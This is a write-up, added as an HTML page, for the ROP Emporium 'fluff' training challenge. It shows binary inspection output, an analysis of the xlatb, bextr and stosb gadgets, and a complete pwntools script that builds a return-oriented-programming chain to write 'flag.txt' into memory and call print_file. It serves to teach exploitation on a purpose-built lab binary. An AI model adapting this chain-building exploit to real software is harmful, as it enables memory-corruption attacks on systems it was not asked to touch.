@@ -1,0 +1,161 @@
+<html>
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>ROP Emporium Pt. 6: fluff</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+<a href="https://ropemporium.com">ROP Emporium</a> is a collection of challenges designed to teach return-oriented 
+programming (ROP) techniques by slowly introducing new concepts and increasing 
+difficulty. If you're looking for a spoiler-free guide, check out the one 
+included on their <a href="https://ropemporium.com/guide.html">website</a>. 
+
+This next challenge is a little less like the last one and more like write4,
+where we have a print_file() function and we need to write our string into 
+memory and call it. The difference here, is that fluff is supposed to be a much
+more sparse binary with much more questionable gadgets.
+
+We can start, as usual, by determining the layout of the file
+
+radare
+──────────────────────────────────────────────────────────────────────
+  $ rabin2 -i ./fluff
+  [Imports]
+  nth vaddr      bind   type   lib name
+  ―――――――――――――――――――――――――――――――――――――
+  1   0x00400500 GLOBAL FUNC       pwnme
+  2   ---------- GLOBAL FUNC       __libc_start_main
+  3   ---------- WEAK   NOTYPE     __gmon_start__
+  4   0x00400510 GLOBAL FUNC       print_file
+  
+  $ rabin2 -S ./fluff | grep rw
+  18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
+  19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
+  20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
+  21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
+  22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
+  23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
+  24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
+──────────────────────────────────────────────────────────────────────
+
+As we'll see, it's pretty similar to the last couple as far as that goes. We'll 
+then work backwords to figure out how we need to construct our chain.
+
+To start, we'll want something to move our "flag.txt" to our rw section.
+
+Checking ropper normally doesn't yield much, as there's a bunch of garbage and
+not a lot of particularly simple gadgets to use, but that was expected.
+
+We do have a pop rdi gadget that will likely be useful for calling our 
+print_file() function later though.
+
+ropper
+───────────────────────────────────
+  <r>0x00000000004006a3</r>: <y>pop</y> rdi<bl>;</bl> <y>ret</y><bl>;</bl>
+───────────────────────────────────
+
+However, there's one more hint on the page:
+
+<a href="https://ropemporium.com/challenge/fluff.html">fluff.html</a>
+─────────────────────────────────────────────────────────────────────────
+  Some useful(?) gadgets are available at the questionableGadgets symbol.
+─────────────────────────────────────────────────────────────────────────
+
+We'll then check that out in radare.
+
+radare
+──────────────────────────────────────────────────────────────────
+  <y>[0x00400628]></y> pd
+              <bl>;-- questionableGadgets:</bl>
+              <bl>;-- rip:</bl>
+              <g>0x00400628</g>      <bl>d7</bl>             <bl>xlatb</bl>
+              <g>0x00400629</g>      <bl>c3</bl>             <r>ret</r>
+              <g>0x0040062a</g>      <y>5a</y>             <pl>pop</pl> <bl>rdx</bl>
+              <g>0x0040062b</g>      <y>59</y>             <pl>pop</pl> <bl>rcx</bl>
+              <g>0x0040062c</g>      <y>48</y><bl>81c1f2</bl><y>3e</y><g>..</g>   <y>add</y> <bl>rcx</bl>, <y>0x3ef2</y>
+              <g>0x00400633</g>      <bl>c4e2e8f7d9</bl>     <bl>bextr rbx</bl>, <bl>rcx</bl>, <bl>rdx</bl>
+              <g>0x00400638</g>      <bl>c3</bl>             <r>ret</r>
+              <g>0x00400639</g>      <bl>aa</bl>             <pl>stosb byte</pl> [<bl>rdi</bl>], <bl>al</bl>
+              <g>0x0040063a</g>      <bl>c3</bl>             <r>ret</r>
+              <g>0x0040063b</g>      <bl>0f1f</bl><y>44</y><g>0000</g>     <bl>nop dword</bl> [<bl>rax</bl> + <bl>rax</bl>]
+              <r>; DATA XREF from entry0 @ 0x400536(r)</r>
+──────────────────────────────────────────────────────────────────
+
+There are a couple gadgets here that stand out as different from the rest and 
+those are xlatb, bextr, and stosb.
+
+xlatb looks up a byte in a table in memory (RBX) indexed by AL, and copies the 
+table back to AL.
+bextr extracts bits, specifying source, index and length. In this case, the
+source is RBX, index is RCX and length is RDX.
+stosb stores a byte from the AL register to a location in memory, in this case,
+rdi.
+
+Working backwards as the hint suggests:
+
+The print_file() function, as usual, uses the rdi register, to control the rdi
+register, we can use stosb, in order to do that we need to control the AL
+register, which we can do with xlatb, to use xlatb we need to control RBX, and
+we can do that with bextr.
+
+Putting together the final script took a lot more troubleshooting and also 
+google searches than the last ones.
+
+exploit.py
+───────────────────────────────────────────────────────────────────────────────
+<bl>from</bl> pwn <bl>import</bl> *
+
+e = ELF(<pl>'fluff'</pl>)
+p = process(e.path)
+context(arch=<pl>'amd64'</pl>, os=<pl>'linux'</pl>, endian=<pl>'little'</pl>)
+
+junk = b<pl>'A'</pl> * <pl>40</pl>
+flag = (b<pl>"flag.txt"</pl>)
+data = <pl>0x00601028</pl>                           <bl># .data</bl>
+print_file = p64(<pl>0x00400510</pl>)                <bl># print_file()</bl>
+xlatb = p64(<pl>0x00400628</pl>)                     <bl># xlatb</bl>
+pop_rdx_rcx_add_rcx_bextr = p64(<pl>0x0040062a</pl>) <bl># pop rdx; pop rcx; add rcx, </bl>
+					    <bl># 0x3ef2; bextr rbx, rcx, rdx; ret; </bl>
+bextr = p64(<pl>0x00400633</pl>)                     <bl># bextr rbx, rcx, rdx</bl>
+stosb = p64(<pl>0x00400639</pl>)                     <bl># stosb byte [rdi], al </bl>
+pop_rdi = p64(<pl>0x004006a3</pl>)                   <bl># pop rdi</bl>
+
+					    <bl># make "flag.txt" an array of</bl> 
+					    <bl># addresses</bl>
+flag_chars = []
+<y>for</y> i <y>in</y> flag:                              <bl># address of character + offset</bl>
+    addr = hex(read(<pl>'fluff'</pl>).find(i) + e.address)
+    flag_chars.append(addr)                 <bl># add to array</bl>
+
+payload = junk
+
+<y>for</y> i, flag_chars <y>in</y> enumerate(flag_chars):
+    if(i == <pl>0</pl>):                             <bl># set current rax value (previous</bl>
+	rax = <pl>0xb</pl>                           <bl># value to be set)</bl>
+    else:
+	rax = flag[i - <pl>1</pl>]                   <bl># after first run, previous value</bl>
+    
+    payload += pop_rdx_rcx_add_rcx_bextr
+    payload += p64(<pl>0x4000</pl>)                  <bl># length of 40 (64 bits)</bl>
+    payload += p64(int(flag_chars, <pl>16</pl>) - rax - <pl>0x3ef2</pl>)
+    payload += xlatb                        <bl># char index - rax - 0x3ef2</bl>
+    payload += pop_rdi                      <bl># (added junk from gadget)</bl>
+    payload += p64(data + i)                <bl># write to data + char index</bl>
+    payload += stosb
+
+payload += pop_rdi                          <bl># print file</bl>
+payload += p64(data)
+payload += print_file
+
+<bl>print</bl>(payload)
+
+p.sendline(payload)
+log.info(p.clean())
+───────────────────────────────────────────────────────────────────────────────
+</pre>
+</body>
+</html>
